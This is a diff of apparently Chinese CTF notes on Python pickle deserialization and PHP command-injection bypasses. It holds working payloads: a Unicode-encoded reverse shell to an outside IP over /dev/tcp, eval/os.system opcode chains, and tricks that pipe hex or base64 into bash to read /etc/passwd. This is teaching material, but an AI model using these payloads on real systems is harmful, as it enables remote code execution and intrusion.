-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pk <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(yourobject)
-</span></span><span style="display:flex;"><span>pk <span style="color:#f92672">=</span> pk<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;os&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ooss&#39;</span>)</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="0030ad9" class="language-python ">
+  <code>pk = pickle.dumps(yourobject)
+pk = pk.replace(b&#39;os&#39;, b&#39;ooss&#39;)</code>
+  </pre>
+  </div>
 <p>字符串拼接</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span>(object):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> eval,(<span style="color:#e6db74">&#34;__import__(&#39;o&#39;+&#39;s&#39;).system(&#39;env |tee b&#39;)&#34;</span>,)</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="01a24cf" class="language-python ">
+  <code>class A(object):
+    def __reduce__(self):
+        return eval,(&#34;__import__(&#39;o&#39;&#43;&#39;s&#39;).system(&#39;env |tee b&#39;)&#34;,)</code>
+  </pre>
+  </div>
 <p>其他：</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>a <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;ser_data&#39;</span>))<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;builtin&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;BuIltIn&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;os&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Os&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;bytes&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Bytes&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;R&#39;</span> <span style="color:#f92672">in</span> a <span style="color:#f92672">or</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;i&#39;</span> <span style="color:#f92672">in</span> a <span style="color:#f92672">or</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;o&#39;</span> <span style="color:#f92672">in</span> a <span style="color:#f92672">or</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span> <span style="color:#f92672">in</span> a:  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> pickle<span style="color:#f92672">.</span>UnpicklingError(<span style="color:#e6db74">&#34;R i o b is forbidden&#34;</span>)  
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>pickle<span style="color:#f92672">.</span>loads(base64<span style="color:#f92672">.</span>b64decode(session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;ser_data&#39;</span>)))</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="20e6e37" class="language-python ">
+  <code>a = base64.b64decode(session.get(&#39;ser_data&#39;)).replace(b&#34;builtin&#34;, b&#34;BuIltIn&#34;).replace(b&#34;os&#34;, b&#34;Os&#34;).replace(b&#34;bytes&#34;, b&#34;Bytes&#34;)
+
+if b&#39;R&#39; in a or b&#39;i&#39; in a or b&#39;o&#39; in a or b&#39;b&#39; in a:  
+    raise pickle.UnpicklingError(&#34;R i o b is forbidden&#34;)  
+
+pickle.loads(base64.b64decode(session.get(&#39;ser_data&#39;)))</code>
+  </pre>
+  </div>
 <p>检测的是a有无riob，但是运行时还是ser_data，利用o和s连用组成os，替换为Os绕过
 反弹shell用到<code>i</code>，会被检测，所以用<code>V</code>，能识别unicode编码</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>b&#39;&#39;&#39;(cos
-</span></span><span style="display:flex;"><span>system
-</span></span><span style="display:flex;"><span>V&#39;\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0033\u0039\u002e\u0032\u0032\u0034\u002e\u0031\u0033\u0030\u002e\u0031\u0038\u0033\u002f\u0031\u0030\u0030\u0030\u0032\u0020\u0030\u003e\u0026\u0031&#39;
-</span></span><span style="display:flex;"><span>os.&#39;&#39;&#39;</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="2b92a9d" class="language-text ">
+  <code>b&#39;&#39;&#39;(cos
+system
+V&#39;\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0033\u0039\u002e\u0032\u0032\u0034\u002e\u0031\u0033\u0030\u002e\u0031\u0038\u0033\u002f\u0031\u0030\u0030\u0030\u0032\u0020\u0030\u003e\u0026\u0031&#39;
+os.&#39;&#39;&#39;</code>
+  </pre>
+  </div>
 <p>因为<code>s</code>的作用是从堆栈中弹出三个值，一个字典，一个键和值。键/值条目是添加到字典，它被推回到堆栈上，所以前面需要添加一个字典和一个键：</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>b&#39;&#39;&#39;(S&#39;ba&#39;  
-</span></span><span style="display:flex;"><span>S&#39;ss&#39;  
-</span></span><span style="display:flex;"><span>dS&#39;sdasda&#39;  
-</span></span><span style="display:flex;"><span>(cos  
-</span></span><span style="display:flex;"><span>system  
-</span></span><span style="display:flex;"><span>V&#39;\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0033\u0039\u002e\u0032\u0032\u0034\u002e\u0031\u0033\u0030\u002e\u0031\u0038\u0033\u002f\u0031\u0030\u0030\u0030\u0032\u0020\u0030\u003e\u0026\u0031&#39;  
-</span></span><span style="display:flex;"><span>os.&#39;&#39;&#39;</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="5e42be2" class="language-text ">
+  <code>b&#39;&#39;&#39;(S&#39;ba&#39;  
+S&#39;ss&#39;  
+dS&#39;sdasda&#39;  
+(cos  
+system  
+V&#39;\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0033\u0039\u002e\u0032\u0032\u0034\u002e\u0031\u0033\u0030\u002e\u0031\u0038\u0033\u002f\u0031\u0030\u0030\u0030\u0032\u0020\u0030\u003e\u0026\u0031&#39;  
+os.&#39;&#39;&#39;</code>
+  </pre>
+  </div>
 <h2 id="手写opcode">手写opcode <a href="#%e6%89%8b%e5%86%99opcode" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><p>三种print的方法：</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># __import__(&#34;builtins&#34;).print(&#39;a&#39;, &#39;b&#39;)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>R <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;&#39;cbuiltins
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(S&#39;a&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S&#39;b&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tR.
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>o <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;&#39;(cbuiltins
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S&#39;a&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S&#39;b&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">o.
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;&#39;(S&#39;a&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S&#39;b&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ibuiltins
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">print
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">.
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="5874145" class="language-python ">
+  <code># __import__(&#34;builtins&#34;).print(&#39;a&#39;, &#39;b&#39;)
+
+R = b&#39;&#39;&#39;cbuiltins
+print
+(S&#39;a&#39;
+S&#39;b&#39;
+tR.
+&#39;&#39;&#39;
+
+o = b&#39;&#39;&#39;(cbuiltins
+print
+S&#39;a&#39;
+S&#39;b&#39;
+o.
+&#39;&#39;&#39;
+
+i = b&#39;&#39;&#39;(S&#39;a&#39;
+S&#39;b&#39;
+ibuiltins
+print
+.
+&#39;&#39;&#39;</code>
+  </pre>
+  </div>
 <p>例：执行系统命令：
 <code>builtins.getattr(builtins, 'eval')(&quot;__import__('os').system('pwd')&quot;)</code>
 用到<code>c</code>指令导入的有<code>builtins.getattr</code>和<code>builtins</code>，但pickle不能直接获取<code>builtins</code>一级模块，所以<code>builtins</code>不能直接导入，需要用：
@@ -869,50 +1216,108 @@ payload:</li>
 最内层<code>function(&quot;__import__('os').system('pwd')&quot;)</code></p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>b&#39;&#39;&#39;(
-</span></span><span style="display:flex;"><span>S&#39;__import__(&#39;os&#39;).system(&#39;pwd&#39;)&#39;  
-</span></span><span style="display:flex;"><span>o.  
-</span></span><span style="display:flex;"><span>&#39;&#39;&#39;</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="0448e59" class="language-text ">
+  <code>b&#39;&#39;&#39;(
+S&#39;__import__(&#39;os&#39;).system(&#39;pwd&#39;)&#39;  
+o.  
+&#39;&#39;&#39;</code>
+  </pre>
+  </div>
 <p>然后是最外层的<code>builtins.getattr</code></p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>b&#39;&#39;&#39;(
-</span></span><span style="display:flex;"><span>///////
-</span></span><span style="display:flex;"><span>(cbuiltins  
-</span></span><span style="display:flex;"><span>getattr  
-</span></span><span style="display:flex;"><span>arg1  
-</span></span><span style="display:flex;"><span>S&#39;eval&#39;  
-</span></span><span style="display:flex;"><span>o  
-</span></span><span style="display:flex;"><span>///////
-</span></span><span style="display:flex;"><span>S&#39;__import__(&#39;os&#39;).system(&#39;pwd&#39;)&#39;  
-</span></span><span style="display:flex;"><span>o.  
-</span></span><span style="display:flex;"><span>&#39;&#39;&#39;</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="3ce1297" class="language-text ">
+  <code>b&#39;&#39;&#39;(
+///////
+(cbuiltins  
+getattr  
+arg1  
+S&#39;eval&#39;  
+o  
+///////
+S&#39;__import__(&#39;os&#39;).system(&#39;pwd&#39;)&#39;  
+o.  
+&#39;&#39;&#39;</code>
+  </pre>
+  </div>
 <p>补全<code>arg1</code>，从内层开始`(builtins.globals(), &lsquo;builtins&rsquo;)</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>b&#39;&#39;&#39;((cbuiltins  
-</span></span><span style="display:flex;"><span>getattr
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>///////
-</span></span><span style="display:flex;"><span>(cbuiltins  
-</span></span><span style="display:flex;"><span>globals  
-</span></span><span style="display:flex;"><span>o  
-</span></span><span style="display:flex;"><span>S&#39;builtins&#39;  
-</span></span><span style="display:flex;"><span>/////// 
-</span></span><span style="display:flex;"><span>S&#39;eval&#39;  
-</span></span><span style="display:flex;"><span>o
-</span></span><span style="display:flex;"><span>S&#39;__import__(&#39;os&#39;).system(&#39;pwd&#39;)&#39;  
-</span></span><span style="display:flex;"><span>o.  
-</span></span><span style="display:flex;"><span>&#39;&#39;&#39;  
-</span></span><span style="display:flex;"><span>pickletools.dis(test)</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="7c15987" class="language-text ">
+  <code>b&#39;&#39;&#39;((cbuiltins  
+getattr
+
+///////
+(cbuiltins  
+globals  
+o  
+S&#39;builtins&#39;  
+/////// 
+S&#39;eval&#39;  
+o
+S&#39;__import__(&#39;os&#39;).system(&#39;pwd&#39;)&#39;  
+o.  
+&#39;&#39;&#39;  
+pickletools.dis(test)</code>
+  </pre>
+  </div>
 <p>最后是<code>builtins.getattr(builtins.dict, 'get')</code></p>
 
 
-    
-    <pre tabindex="0"><code>b&#39;&#39;&#39;((cbuiltins
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="8f5f90f" class="language- ">
+  <code>b&#39;&#39;&#39;((cbuiltins
 getattr
 
 (
@@ -937,25 +1342,42 @@ o
 
 S&#39;__import__(&#39;os&#39;).system(&#39;pwd&#39;)&#39; 
 o. 
-&#39;&#39;&#39;</code></pre>
+&#39;&#39;&#39;</code>
+  </pre>
+  </div>
 <p>最终payload：</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>b&#39;&#39;&#39;((cbuiltins  
-</span></span><span style="display:flex;"><span>getattr  
-</span></span><span style="display:flex;"><span>((cbuiltins  
-</span></span><span style="display:flex;"><span>getattr  
-</span></span><span style="display:flex;"><span>cbuiltins  
-</span></span><span style="display:flex;"><span>dict  
-</span></span><span style="display:flex;"><span>S&#39;get&#39;  
-</span></span><span style="display:flex;"><span>o(cbuiltins  
-</span></span><span style="display:flex;"><span>globals  
-</span></span><span style="display:flex;"><span>oS&#39;builtins&#39;  
-</span></span><span style="display:flex;"><span>oS&#39;eval&#39;  
-</span></span><span style="display:flex;"><span>oS&#39;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#39;  
-</span></span><span style="display:flex;"><span>o.  
-</span></span><span style="display:flex;"><span>&#39;&#39;&#39;</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="88ac680" class="language-text ">
+  <code>b&#39;&#39;&#39;((cbuiltins  
+getattr  
+((cbuiltins  
+getattr  
+cbuiltins  
+dict  
+S&#39;get&#39;  
+o(cbuiltins  
+globals  
+oS&#39;builtins&#39;  
+oS&#39;eval&#39;  
+oS&#39;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&#39;  
+o.  
+&#39;&#39;&#39;</code>
+  </pre>
+  </div>
 
     </div>
 
@@ -1324,7 +1746,7 @@ o.
                 id:  8 ,
                 href: "\/docs\/ctf\/%E7%9F%A5%E8%AF%86%E7%82%B9\/rce\/",
                 title: "RCE",
-                description: "PHP link基本函数 link1.eval()可以将传入的字符串当作php代码执行 解题时常用的指令：phpinfo()查看是否有回显 system()指令用于执行系统命令，如\nsystem('ls'); system('cat'); //记得在每一条指令后面加； 其它函数：\n//具体函数内容查看手册 exec shell_exec passthru popen proc_popen Assert(mixed $assertion,string $description = ?) //会检查assertion，如果是字符串，会被当成php代码执行 Call_user_func(callable $callback …..) //callback是被调用的回调函数 Call_user_func_array(callable $callback) //同上 Creat_function(args,code) //如 \u003c?php error_reporting(0); $new_func = create_function('$a,$b','return \"$a \".\"$b\";');//new_func为函数名，$a $b为参数，后面代码 echo $new_func('hello','hack').\"\\n\"; ?\u003e 连接两个命令\n| || \u0026 \u0026\u0026 ; 绕过 link 简单绕过关键词过滤a=eval($_GET['A'])\u0026A=system 内联执行：cat `ls`，echo $(ls) 使用’‘包裹一组指令 ('ls /') 绕过内置过滤函数\n$url=escapeshellarg($url); $url=escapeshellcmd($url); /* 连用会产生单引号逃逸，传入1' xxx 返回'1'\\\\''XXX\\' \\被转义，还多出来一个' */ 绕过文件名限制\ncat /f* # 过滤f l a g时，使用glob通配符绕过 # file:///D:/ctf/doc/Linux shell通配符_ glob.htm more /[e-h][k-m][0-b][e-h] # “ _[A-Fa-f0-9]_ ”相当于 \" _[ABCDEFabcdef0123456789]_ \".) # “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母” 编码绕过\n",
+                description: "PHP link基本函数 link1.eval()可以将传入的字符串当作php代码执行 解题时常用的指令：phpinfo()查看是否有回显 system()指令用于执行系统命令，如\nsystem('ls'); system('cat'); //记得在每一条指令后面加； 其它函数：\n//具体函数内容查看手册 exec shell_exec passthru popen proc_popen Assert(mixed $assertion,string $description = ?) //会检查assertion，如果是字符串，会被当成php代码执行 Call_user_func(callable $callback …..) //callback是被调用的回调函数 Call_user_func_array(callable $callback) //同上 Creat_function(args,code) //如 \u003c?php error_reporting(0); $new_func = create_function('$a,$b','return \"$a \".\"$b\";');//new_func为函数名，$a $b为参数，后面代码 echo $new_func('hello','hack').\"\\n\"; ?\u003e 连接两个命令\n| || \u0026 \u0026\u0026 ; 绕过 link 简单绕过关键词过滤a=eval($_GET['A'])\u0026A=system 内联执行：cat `ls`，echo $(ls) 使用’‘包裹一组指令 ('ls /') 绕过内置过滤函数\n$url=escapeshellarg($url); $url=escapeshellcmd($url); /* 连用会产生单引号逃逸，传入1' xxx 返回'1'\\\\''XXX\\' \\被转义，还多出来一个' */ 绕过文件名限制\n",
                 content: "PHP link基本函数 link1.eval()可以将传入的字符串当作php代码执行 解题时常用的指令：phpinfo()查看是否有回显 system()指令用于执行系统命令，如\nsystem('ls'); system('cat'); //记得在每一条指令后面加； 其它函数：\n//具体函数内容查看手册 exec shell_exec passthru popen proc_popen Assert(mixed $assertion,string $description = ?) //会检查assertion，如果是字符串，会被当成php代码执行 Call_user_func(callable $callback …..) //callback是被调用的回调函数 Call_user_func_array(callable $callback) //同上 Creat_function(args,code) //如 \u003c?php error_reporting(0); $new_func = create_function('$a,$b','return \"$a \".\"$b\";');//new_func为函数名，$a $b为参数，后面代码 echo $new_func('hello','hack').\"\\n\"; ?\u003e 连接两个命令\n| || \u0026 \u0026\u0026 ; 绕过 link 简单绕过关键词过滤a=eval($_GET['A'])\u0026A=system 内联执行：cat `ls`，echo $(ls) 使用’‘包裹一组指令 ('ls /') 绕过内置过滤函数\n$url=escapeshellarg($url); $url=escapeshellcmd($url); /* 连用会产生单引号逃逸，传入1' xxx 返回'1'\\\\''XXX\\' \\被转义，还多出来一个' */ 绕过文件名限制\ncat /f* # 过滤f l a g时，使用glob通配符绕过 # file:///D:/ctf/doc/Linux shell通配符_ glob.htm more /[e-h][k-m][0-b][e-h] # “ _[A-Fa-f0-9]_ ”相当于 \" _[ABCDEFabcdef0123456789]_ \".) # “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母” 编码绕过\n# 回显只有数字情况下，使用od进行输出： od -t d1 /flag # 这是一个命令行指令，用于以十进制形式显示 /flag 文件的内容，具体来说-t 参数用于指定展示的数据格式，d1 表示每个数值使用一个字节来显示，即按字节读取。 # 16进制，先bin2hex php -r eval(hex2bin(substr(_十六进制,1))) # 63617420666c61672e706870是cat flag.php的16进制 # cat /etc/passwd echo \"636174202F6574632F706173737764\" | xxd -r -p|bash # php 十六进制绕过 system(); \"\\x73\\x79\\x73\\x74\\x65\\x6d\"(); # 或者base64/32 echo \"base64编码\"|base64 -d|bash echo \"base64编码\"|base64 -d|sh echo 'Y2F0wqAK' | base64 -d /etc/passwd # cat /etc/passwd # 八进制 # ls $(printf \"\\154\\163\") 绕过空格\n%09（url传递）(tab) %20(space) ${IFS} $IFS$9 $IFS$1 \u003c\u003e（cat\u003c\u003e/flag） \u003c（cat"
             }
         );
@@ -1351,7 +1773,7 @@ o.
                 id:  11 ,
                 href: "\/docs\/ctf\/%E7%9F%A5%E8%AF%86%E7%82%B9\/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/",
                 title: "Pickle反序列化",
-                description: "可被序列化的目标： link None，True，False 整数，浮点数，复数 str，byte，bytearray 只包含可序列化对象的集合：tuple，list，set，dict 定义在模块最外层的函数，指使用def定义的函数，而不是lambda 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类 反序列化过程 linkpickle反序列化依靠PVM（Pickle Virtual Machine）进行。 其涉及三个部分：\n解析引擎 存放到栈 存储到内存 解析引擎：从流中读取opcode和参数，对其进行解释处理，直到遇到.停止，最后留在栈顶的值就是反序列化对象。 栈：由list实现，存储临时对象，参数以及对象 内存memo：由dict实现，为PVM的生命周期提供存储，即将反序列化完成的数据以key-value的形式存在memo中以供后面使用。 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：\nimport pickle a={'1': 1, '2': 2} print(f'# 原变量：{a!r}') for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 原变量：{'1': 1, '2': 2} pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.' pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本4 b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' pickle3版本opcode示例： 原数据：abcd b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.'\n\\x80：协议头声明，读取此字符串后，会再读取一个字节 \\x03：协议版本 \\x04\\x00\\x00\\x00：数据长度：4 abcd数据 q存储在栈顶的字符串长度 \\x00栈顶位置，一个字节 .数据截止 b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(Vname\\nVrxz\\nVgrade\\nVG2\\nub.'\nc：GLOBAL操作符，连续读取两个字符串，分别作为module和name，以\\n分割，然后把module.name压入栈。注意此操作符使用find_class函数，作用为从x模块找到y，且只能在y在x顶层情况下找到y )：将一个空的元组tuple压入当前栈 \\x81：从栈中先弹出一个元素，记为args；再弹出一个元素记为cls，接下来执行cls.__new__(cls,*arg)，然后把得到的内容压入栈。即弹出参数和类，利用这个参数实例化类。 }：将一个空dist压入栈 (：MARK操作符，load_mark；将当前栈作为一个list，压进前序栈；然后把当前栈清空。 V：读入字符串，以\\n结尾，压入栈。 u：调用pop_mark，记录当前栈为list，在load_mark结束后返回；弹出前序栈栈顶，用list覆盖前序栈。执行之后结果：arr=['name','rxz','grade','G2']，当前栈为__main__.Sudent类和空dict；拿到当前栈的末尾元素，必须为dict，两个一组读取arr里的元素，前者为key后者为value存入dict。得到{'name': 'rxz', 'grade': 'G2'}，现在栈里面有一个实例一个字典 b：将当前栈栈顶存进state，弹出；当前栈栈顶为inst，弹出；用state的值更新实例inst；压入栈。此处使用的方法为：如果inst有__setstate__方法，直接交给方法，否则把state中的字典合并到inst.__dict__ .：结束；最后得到的结果是__main__.Sudent，其name值为rxz，grade值是G2 t：寻找栈中的上一个mark，并组合之间的数据为元组 S：实例化一个字符串对象 pickle0版本部分opcode：\n",
+                description: "可被序列化的目标： link None，True，False 整数，浮点数，复数 str，byte，bytearray 只包含可序列化对象的集合：tuple，list，set，dict 定义在模块最外层的函数，指使用def定义的函数，而不是lambda 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类 反序列化过程 linkpickle反序列化依靠PVM（Pickle Virtual Machine）进行。 其涉及三个部分：\n解析引擎 存放到栈 存储到内存 解析引擎：从流中读取opcode和参数，对其进行解释处理，直到遇到.停止，最后留在栈顶的值就是反序列化对象。 栈：由list实现，存储临时对象，参数以及对象 内存memo：由dict实现，为PVM的生命周期提供存储，即将反序列化完成的数据以key-value的形式存在memo中以供后面使用。 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：\nimport pickle a={'1': 1, '2': 2} print(f'# 原变量：{a!r}') for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 原变量：{'1': 1, '2': 2} pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.' pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本4 b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' pickle3版本opcode示例： 原数据：abcd b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.'\n\\x80：协议头声明，读取此字符串后，会再读取一个字节 \\x03：协议版本 \\x04\\x00\\x00\\x00：数据长度：4 abcd数据 q存储在栈顶的字符串长度 \\x00栈顶位置，一个字节 .数据截止 b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(Vname\\nVrxz\\nVgrade\\nVG2\\nub.'\n",
                 content: "可被序列化的目标： link None，True，False 整数，浮点数，复数 str，byte，bytearray 只包含可序列化对象的集合：tuple，list，set，dict 定义在模块最外层的函数，指使用def定义的函数，而不是lambda 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类 反序列化过程 linkpickle反序列化依靠PVM（Pickle Virtual Machine）进行。 其涉及三个部分：\n解析引擎 存放到栈 存储到内存 解析引擎：从流中读取opcode和参数，对其进行解释处理，直到遇到.停止，最后留在栈顶的值就是反序列化对象。 栈：由list实现，存储临时对象，参数以及对象 内存memo：由dict实现，为PVM的生命周期提供存储，即将反序列化完成的数据以key-value的形式存在memo中以供后面使用。 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：\nimport pickle a={'1': 1, '2': 2} print(f'# 原变量：{a!r}') for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 原变量：{'1': 1, '2': 2} pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.' pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本3 